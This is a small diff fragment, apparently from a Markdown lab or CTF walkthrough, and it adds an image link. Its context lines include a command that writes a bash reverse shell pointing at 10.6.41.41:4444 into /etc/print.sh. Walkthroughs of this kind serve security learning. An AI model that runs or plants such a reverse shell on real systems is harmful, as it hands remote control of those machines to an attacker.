@@ -132,5 +132,7 @@ echo '#!/bin/bash
 bash -i >& /dev/tcp/10.6.41.41/4444 0>&1' > /etc/print.sh
 ```
 
+![image](https://github.com/user-attachments/assets/f21ea88e-2289-4bc0-b72b-f8b55b5a60e6)
+
 
 
